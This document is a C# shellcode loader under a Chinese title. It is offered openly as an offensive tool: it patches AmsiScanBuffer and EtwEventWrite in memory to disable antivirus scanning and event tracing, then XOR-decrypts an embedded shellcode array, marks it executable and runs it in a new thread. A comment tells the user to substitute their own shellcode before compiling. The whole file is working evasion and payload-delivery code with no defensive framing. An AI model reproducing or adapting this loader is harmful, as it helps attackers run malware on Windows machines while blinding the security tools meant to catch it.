**C# 内存加载型 shellcode runner（AmsiScanBuffer patch + ETW patch + 分段解密加载）**

```csharp
using System;
using System.Runtime.InteropServices;

class Loader
{
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string proc);
    [DllImport("kernel32")]
    static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint allocType, uint protect);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr attrs, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);
    [DllImport("kernel32")]
    static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    // 已经 XOR 0x42 加密过的 raw shellcode，编译前替换成自己的
    static byte[] enc = new byte[] { 0x00 /* ... */ };

    static byte[] Dec(byte[] b, byte k)
    {
        var o = new byte[b.Length];
        for (int i = 0; i < b.Length; i++) o[i] = (byte)(b[i] ^ k);
        return o;
    }

    static void PatchAmsi()
    {
        IntPtr h = GetModuleHandle("amsi.dll");
        if (h == IntPtr.Zero) return;
        IntPtr p = GetProcAddress(h, "AmsiScanBuffer");
        uint old;
        VirtualProtect(p, (UIntPtr)6, 0x40, out old);
        // xor eax,eax; ret
        Marshal.WriteByte(p, 0, 0x31);
        Marshal.WriteByte(p, 1, 0xC0);
        Marshal.WriteByte(p, 2, 0xC3);
        VirtualProtect(p, (UIntPtr)6, old, out old);
    }

    static void PatchEtw()
    {
        IntPtr h = GetModuleHandle("ntdll.dll");
        if (h == IntPtr.Zero) return;
        IntPtr p = GetProcAddress(h, "EtwEventWrite");
        uint old;
        VirtualProtect(p, (UIntPtr)4, 0x40, out old);
        Marshal.WriteByte(p, 0, 0xC3); // ret
        VirtualProtect(p, (UIntPtr)4, old, out old);
    }

    static void Main()
    {
        PatchAmsi();
        PatchEtw();
        byte[] sc = Dec(enc, 0x42);
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x04);
        Marshal.Copy(sc, 0, mem, sc.Length);
        uint old2;
        VirtualProtect(mem, (UIntPtr)sc.Length, 0x20, out old2);
        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }
}
```

